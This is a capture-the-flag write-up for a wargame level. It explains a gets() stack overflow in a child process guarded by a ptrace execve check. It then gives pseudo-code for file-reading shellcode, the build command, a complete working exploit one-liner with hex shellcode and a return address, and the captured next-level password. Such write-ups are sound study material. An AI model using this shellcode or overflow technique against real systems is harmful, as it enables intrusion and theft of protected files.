# Buffer Overflow under execve protection

see source.c

## Analysis

This was a rough one.
First thing after disassembling we instantly notice: the program is using 'gets' on a buffer allocated on the stack, so we can do a easy buffer overflow + modify eip to change wherever we want.
Problem: the buffer will only be modified in the child process and the parent is checking for execve syscall (ptrace /w PTRACE_PEEKUSER). We tried to bypass this protection by doing multiple things like killing the parent (but the program is using prctl on the child so the child terminate instantly after the parent death), or jump on another fork hoping for better result (Didn't manage to get something). The first payload with execve on gdb/strace were working easily but that was because we we're tracing the program so the executable couldn't did it at the same moment.

## Payload

Finally, after hours of trying, we manage to write our payload in nasm that isn't calling execve at all, pseudo-code:
```
fd =open("/home/users/level05/.pass", O_RDONLY);
ret = read(fd, buffer, 41);
write(1, buffer, ret);
exit();
```

()[http://faculty.nps.edu/cseagle/assembly/sys_call.html]
The code of the payload is available in resources/payload.s and was compiling like this:
```
nasm -felf32 payload.s && ld -m elf_i386 payload.o -o a.out
```
Then we just xxd and get what we needed, and do a little payload with a jump at the end (at the address of eip, that jump on the payload):

```
level04@OverRide:~$ (python -c "print('\x31\xc9\xf7\xe1\x6a\x05\x58\x51\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe3\xcd\x80\x50\x5b\x6a\x29\x5a\x8d\x0c\x24\x42\xcd\x80\x50\x5a\x6a\x01\x5b\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80' + 'A' * 86 + '\x60\xd6\xff\xff')") | /home/users/level04/level04 
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```
